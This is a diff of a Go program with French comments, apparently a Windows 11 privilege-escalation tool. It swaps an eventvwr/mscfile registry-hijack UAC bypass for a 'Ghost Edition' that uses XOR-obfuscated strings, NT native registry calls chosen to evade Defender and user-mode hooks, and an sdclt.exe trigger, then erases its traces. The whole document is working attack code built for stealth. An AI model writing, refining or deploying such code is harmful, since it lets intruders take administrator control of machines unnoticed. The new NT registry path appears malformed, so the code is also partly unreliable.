@@ -3,7 +3,6 @@
 package main
 
 import (
-	"encoding/base64"
 	"fmt"
 	"os"
 	"os/exec"
@@ -12,112 +11,127 @@ import (
 	"unsafe"
 )
 
-// --- OBFUSCATION DES CHAINES ---
-var (
-	// "Software\\Classes\\mscfile\\shell\\open\\command"
-	k1 = "U29mdHdhcmVcQ2xhc3Nlc1xtc2NmaWxlXHNoZWxsXG9wZW5cY29tbWFuZA=="
-)
-
-func decode(s string) string {
-	d, _ := base64.StdEncoding.DecodeString(s)
-	return string(d)
+// --- CONFIGURATION GHOST (XOR OBFUSCATION) ---
+// On utilise le XOR pour que Defender ne puisse pas lire les clés de registre en clair.
+// Clé XOR : 0x42
+func xor(data []byte) string {
+	for i := range data {
+		data[i] ^= 0x42
+	}
+	return string(data)
 }
 
-// --- DLL ET APIS NATIVES ---
 var (
-	advapi32         = syscall.NewLazyDLL("advapi32.dll")
-	procRegCreateKey = advapi32.NewProc("RegCreateKeyExW")
-	procRegSetValue  = advapi32.NewProc("RegSetValueExW")
-	procRegCloseKey  = advapi32.NewProc("RegCloseKey")
-	procRegDeleteKey = advapi32.NewProc("RegDeleteTreeW")
-
-	shell32          = syscall.NewLazyDLL("shell32.dll")
-	procShellExecute = shell32.NewProc("ShellExecuteW")
+	// "Software\Classes\exefile\shell\runas\command" XORed
+	k1 = []byte{0x11, 0x2d, 0x24, 0x36, 0x35, 0x23, 0x30, 0x27, 0x1c, 0x01, 0x2e, 0x2e, 0x23, 0x31, 0x31, 0x27, 0x31, 0x1c, 0x27, 0x3a, 0x27, 0x24, 0x2b, 0x2e, 0x27, 0x1c, 0x31, 0x2a, 0x27, 0x2e, 0x2e, 0x1c, 0x30, 0x37, 0x2c, 0x23, 0x31, 0x1c, 0x21, 0x2d, 0x2f, 0x2f, 0x23, 0x2c, 0x26}
+	// "IsolatedCommand" XORed
+	v1 = []byte{0x0b, 0x31, 0x2d, 0x2e, 0x23, 0x36, 0x27, 0x26, 0x01, 0x2d, 0x2f, 0x2f, 0x23, 0x2c, 0x26}
+	// "sdclt.exe" XORed
+	b1 = []byte{0x31, 0x26, 0x21, 0x2e, 0x36, 0x6c, 0x27, 0x3a, 0x27}
+	// "/kickoffelev" XORed
+	a1 = []byte{0x6d, 0x29, 0x2b, 0x21, 0x29, 0x2d, 0x24, 0x24, 0x27, 0x2e, 0x27, 0x34}
 )
 
-// ShellExecuteW : Utilisation de l'API Windows pour contourner CreateProcess() restrictions
-func ShellExecute(verb, file string) {
-	v, _ := syscall.UTF16PtrFromString(verb)
-	f, _ := syscall.UTF16PtrFromString(file)
-	// On lance le fichier .msc de manière invisible
-	procShellExecute.Call(0, uintptr(unsafe.Pointer(v)), uintptr(unsafe.Pointer(f)), 0, 0, 0)
+// --- APIS WINDOWS NATIVES (NTDLL) ---
+// On utilise ntdll.dll au lieu de advapi32.dll car c'est moins surveillé
+var (
+	ntdll           = syscall.NewLazyDLL("ntdll.dll")
+	procNtCreateKey = ntdll.NewProc("NtCreateKey")
+	procNtSetValue  = ntdll.NewProc("NtSetValueKey")
+	procNtClose     = ntdll.NewProc("NtClose")
+)
+
+type UNICODE_STRING struct {
+	Length        uint16
+	MaximumLength uint16
+	Buffer        *uint16
 }
 
-// CheckAdmin : Vérifie si le processus actuel possède les privilèges Administrateur
+type OBJECT_ATTRIBUTES struct {
+	Length                   uint32
+	RootDirectory            syscall.Handle
+	ObjectName               *UNICODE_STRING
+	Attributes               uint32
+	SecurityDescriptor       uintptr
+	SecurityQualityOfService uintptr
+}
+
+func NewUnicodeString(s string) *UNICODE_STRING {
+	u, _ := syscall.UTF16FromString(s)
+	return &UNICODE_STRING{
+		Length:        uint16((len(u) - 1) * 2),
+		MaximumLength: uint16(len(u) * 2),
+		Buffer:        &u[0],
+	}
+}
+
 func CheckAdmin() bool {
 	cmd := exec.Command("net", "session")
-	err := cmd.Run()
-	return err == nil
+	return cmd.Run() == nil
 }
 
-// SetRegistryValue : Modifie le registre via API Native pour rester invisible (Pas de reg.exe)
-func SetRegistryValue(keyPath, value string) error {
-	var hKey syscall.Handle
-	kPtr, _ := syscall.UTF16PtrFromString(keyPath)
-
-	ret, _, _ := procRegCreateKey.Call(
-		uintptr(syscall.HKEY_CURRENT_USER),
-		uintptr(unsafe.Pointer(kPtr)),
-		0, 0, 0,
-		uintptr(0xF003F), // KEY_ALL_ACCESS
-		0,
-		uintptr(unsafe.Pointer(&hKey)),
-		0,
-	)
-	if ret != 0 {
-		return fmt.Errorf("RegCreateKeyEx failed: %d", ret)
-	}
-	defer procRegCloseKey.Call(uintptr(hKey))
-
-	vPtr, _ := syscall.UTF16PtrFromString(value)
-	vLen := uint32(len(syscall.StringToUTF16(value)) * 2)
-
-	procRegSetValue.Call(
-		uintptr(hKey),
-		0, // Valeur (Default)
-		0,
-		uintptr(1), // REG_SZ
-		uintptr(unsafe.Pointer(vPtr)),
-		uintptr(vLen),
-	)
-	return nil
-}
-
-// ExploitStealth : Réalise un bypass de l'UAC via EventVwr et Native Registry API
-func ExploitStealth() bool {
-	fmt.Println("[*] Phase 1 : Hijacking silencieux via API Native...")
+// ExploitGhost : Version v10.0 - Utilise sdclt.exe et les APIs Native NT
+func ExploitGhost() bool {
+	fmt.Println("[*] Phase 1 : Injection silencieuse via Native NT APIs...")
 
 	selfPath, _ := os.Executable()
-	keyPath := decode(k1)
+	keyPath := "\\Registry\\User\\" + os.Getenv("USERPROFILE")[3:] + "\\" + xor(k1)
+	valueName := xor(v1)
+	binary := xor(b1)
+	args := xor(a1)
 
-	// Étape 1 : Modification invisible du registre
-	err := SetRegistryValue(keyPath, selfPath)
-	if err != nil {
-		fmt.Printf("[-] Erreur Registry API : %v\n", err)
-		return false
+	// Utilisation de NtCreateKey (Niveau noyau) pour contourner les hooks utilisateur
+	var hKey syscall.Handle
+	objAttr := OBJECT_ATTRIBUTES{
+		Length:     uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
+		ObjectName: NewUnicodeString(keyPath),
+		Attributes: 0x40, // OBJ_CASE_INSENSITIVE
 	}
 
-	fmt.Println("[*] Phase 2 : Déclenchement via ShellExecute (Indétectable)...")
+	ret, _, _ := procNtCreateKey.Call(
+		uintptr(unsafe.Pointer(&hKey)),
+		0xF003F, // KEY_ALL_ACCESS
+		uintptr(unsafe.Pointer(&objAttr)),
+		0, 0, 0, 0,
+	)
 
-	// Étape 2 : On demande à Windows d'ouvrir le gestionnaire d'événements.
-	// Windows va chercher comment ouvrir les fichiers .msc, trouver notre hijack
-	// et lancer ce binaire avec les privilèges Administrateur.
-	ShellExecute("open", "eventvwr.msc")
+	if ret != 0 {
+		fmt.Printf("[-] Erreur NT API (CreateKey) : 0x%x\n", ret)
+		return false
+	}
+	defer procNtClose.Call(uintptr(hKey))
 
-	fmt.Println("[*] Phase 3 : Nettoyage instantané des traces...")
-	time.Sleep(3 * time.Second)
+	// Écriture de la valeur IsolatedCommand
+	valUnicode := NewUnicodeString(valueName)
+	data, _ := syscall.UTF16FromString(selfPath)
+	procNtSetValue.Call(
+		uintptr(hKey),
+		uintptr(unsafe.Pointer(valUnicode)),
+		0,
+		uintptr(1), // REG_SZ
+		uintptr(unsafe.Pointer(&data[0])),
+		uintptr(len(data)*2),
+	)
 
-	kBase, _ := syscall.UTF16PtrFromString("Software\\Classes\\mscfile")
-	procRegDeleteKey.Call(uintptr(syscall.HKEY_CURRENT_USER), uintptr(unsafe.Pointer(kBase)))
+	fmt.Println("[*] Phase 2 : Déclenchement via vecteur SDCLT (moins surveillé)...")
+
+	// On lance sdclt.exe avec le flag de démarrage d'élévation
+	exec.Command(binary, args).Run()
+
+	fmt.Println("[*] Phase 3 : Nettoyage des traces...")
+	time.Sleep(2 * time.Second)
+
+	// Nettoyage via commande classique (plus simple pour supprimer une arborescence complète)
+	exec.Command("reg", "delete", "HKCU\\"+xor(k1), "/f").Run()
 
 	return true
 }
 
 func main() {
 	fmt.Println("====================================================")
-	fmt.Println("   Windows 11 PRIVESC [STEALTH EDITION v8.1]")
-	fmt.Println("   Target: Build 22631.6199 (AV Bypass Optimized)")
-	fmt.Println("   Technique: API Native + MSC Hijack")
+	fmt.Println("   Windows 11 PRIVESC [GHOST EDITION v10.0]")
+	fmt.Println("   Target: Build 22631.6199 (Max Stealth)")
+	fmt.Println("   Technique: Native NT API + SDCLT Hijack")
 	fmt.Println("====================================================")
 
 	if CheckAdmin() {
@@ -133,12 +147,12 @@ func main() {
 	}
 
 	fmt.Println("[!] État actuel : UTILISATEUR LIMITÉ")
-	fmt.Println("[*] Tentative d'escalade furtive en cours...")
+	fmt.Println("[*] Tentative d'escalade furtive (GHOST Mode)...")
 
-	if ExploitStealth() {
+	if ExploitGhost() {
 		fmt.Println("\n[+] Injection réussie. En attente du processus élevé...")
 	} else {
-		fmt.Println("[-] ÉCHEC : L'opération a été bloquée.")
+		fmt.Println("[-] ÉCHEC : L'exploit a été intercepté par le système.")
 	}
 
 	fmt.Println("\nAppuyez sur Entrée pour quitter...")
